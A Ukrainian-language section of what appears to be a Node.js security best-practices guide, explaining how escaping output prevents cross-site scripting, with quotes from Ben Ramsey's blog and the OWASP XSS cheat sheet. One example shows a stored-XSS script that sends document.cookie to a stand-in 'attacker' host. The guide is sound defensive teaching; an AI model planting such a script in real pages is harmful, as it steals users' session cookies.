# Екрануйте вивід

### Пояснення за один абзац

HTML та інші веб-мови змішують контент з виконуваним кодом — один HTML параграф може містити візуальне представлення даних разом з інструкціями виконання JavaScript. При рендерингу HTML або поверненні даних з API, те, що ми вважаємо чистим контентом, насправді може містити JavaScript код, який буде інтерпретований і виконаний браузером. Це відбувається, наприклад, коли ми рендеримо контент, який був вставлений зловмисником до бази даних — наприклад `<div><script>//шкідливий код</script></div>`. Це можна пом'якшити, інструктуючи браузер розглядати будь-який фрагмент ненадійних даних лише як контент і ніколи не інтерпретувати його — ця техніка називається екрануванням. Багато npm бібліотек і HTML шаблонізаторів надають можливості екранування (наприклад: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). Екранувати потрібно не лише HTML контент, але також CSS і JavaScript


### Приклад коду - Не вставляйте ненадійні дані у ваш HTML

```html
<script>...НІКОЛИ НЕ ВСТАВЛЯЙТЕ НЕНАДІЙНІ ДАНІ СЮДИ...</script>   безпосередньо в скрипт
 
 <!--...НІКОЛИ НЕ ВСТАВЛЯЙТЕ НЕНАДІЙНІ ДАНІ СЮДИ...-->             всередині HTML коментаря
 
 <div ...НІКОЛИ НЕ ВСТАВЛЯЙТЕ НЕНАДІЙНІ ДАНІ СЮДИ...=test />       в назві атрибута
 
 <НІКОЛИ НЕ ВСТАВЛЯЙТЕ НЕНАДІЙНІ ДАНІ СЮДИ... href="/test" />   в назві тега
 
 <style>...НІКОЛИ НЕ ВСТАВЛЯЙТЕ НЕНАДІЙНІ ДАНІ СЮДИ...</style>   безпосередньо в CSS

```

### Приклад коду - Шкідливий контент, який може бути вставлений до БД

```html
<div>
  <b>Псевдокоментар до публікації</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

### Цитата з блогу: "Коли ми не хочемо, щоб символи інтерпретувалися"

З блогу [benramsey.com](https://benramsey.com/articles/escape-output/)
> Дані можуть залишати ваш додаток у формі HTML, надісланого до веб-браузера, SQL, надісланого до бази даних, XML, надісланого до RSS-рідера, WML, надісланого на бездротовий пристрій тощо. Можливості безмежні. Кожен з них має свій власний набір спеціальних символів, які інтерпретуються інакше, ніж решта простого тексту. Іноді ми хочемо надсилати ці спеціальні символи, щоб вони інтерпретувалися (наприклад, HTML теги, надіслані до веб-браузера), тоді як іншим разом (у випадку вводу від користувачів або іншого джерела), ми не хочемо, щоб символи інтерпретувалися, тому нам потрібно їх екранувати.
>
> Екранування також іноді називають кодуванням. Коротше кажучи, це процес представлення даних таким чином, щоб вони не виконувалися або не інтерпретувалися. Наприклад, HTML відрендерить наступний текст у веб-браузері як жирний текст, оскільки теги `<strong>` мають особливе значення:
>
> ```html
> <strong>Це жирний текст.</strong>
> ```
>
> Але, припустимо, я хочу відрендерити теги в браузері і уникнути їх інтерпретації. Тоді мені потрібно екранувати кутові дужки, які мають особливе значення в HTML. Наступне ілюструє екранований HTML:
>
> ```html
> &lt;strong&gt;Це жирний текст.&lt;/strong&gt;
> ```

### Цитата з блогу: "OWASP рекомендує використовувати бібліотеку кодування, орієнтовану на безпеку"

З блогу OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Написання цих кодувальників не є надзвичайно складним, але є досить багато прихованих підводних каменів. Наприклад, ви можете спокуситися використати деякі скорочення екранування, такі як \" в JavaScript. Однак ці значення небезпечні і можуть бути неправильно інтерпретовані вкладеними парсерами в браузері. Ви також можете забути екранувати символ екранування, що зловмисники можуть використати для нейтралізації ваших спроб бути безпечними. **OWASP рекомендує використовувати бібліотеку кодування, орієнтовану на безпеку, щоб переконатися, що ці правила правильно реалізовані**."

### Цитата з блогу: "Ви ПОВИННІ використовувати синтаксис екранування для частини HTML"

З блогу OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Але кодування HTML-сутностей не працює, якщо ви вставляєте ненадійні дані всередину тегу `<script>` будь-де, або атрибута обробника подій, такого як onmouseover, або всередині CSS, або в URL. Тому навіть якщо ви використовуєте метод кодування HTML-сутностей скрізь, ви все ще, швидше за все, вразливі до XSS. Ви ПОВИННІ використовувати синтаксис екранування для частини HTML документа, куди ви вставляєте ненадійні дані."
